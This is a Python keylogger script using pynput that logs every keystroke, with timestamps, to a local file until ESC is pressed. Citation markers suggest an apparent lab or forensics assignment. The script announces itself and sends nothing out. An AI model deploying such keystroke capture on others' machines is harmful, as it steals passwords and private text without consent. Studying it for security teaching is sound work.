import logging
from pynput.keyboard import Key, Listener
import os
from datetime import datetime

# --- CONFIGURATION ---
# Define the path for the log file.
# We use an absolute path to ensure we know exactly where it saves, 
# which helps in the "Forensic Analysis" phase[cite: 48].
LOG_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'logs')
LOG_FILE = os.path.join(LOG_DIR, "key_log.txt")

# Ensure the log directory exists
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Configure logging to write to file with timestamps [cite: 26]
# Format: Date Time : Key
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format='%(asctime)s : %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def on_press(key):
    """
    Callback function invoked when a key is pressed.
    Logs the key to the local file.
    """
    try:
        # Log alphanumeric keys (e.g., 'a', '1', '@')
        logging.info(str(key.char))
    except AttributeError:
        # Log special keys (e.g., Space, Enter, Shift)
        # We explicitly handle space to make logs readable
        if key == Key.space:
            logging.info(" [SPACE] ")
        elif key == Key.enter:
            logging.info(" [ENTER] ")
        else:
            logging.info(str(key))

def on_release(key):
    """
    Callback function invoked when a key is released.
    Stops the listener if the ESC key is pressed.
    """
    if key == Key.esc:
        # Stop listener
        print("[*] Exiting Keylogger...")
        return False

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    print(f"[*] Keylogger started. Saving to: {LOG_FILE}")
    print("[*] Press 'ESC' to stop.")
    
    # Setup the listener using pynput [cite: 24]
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()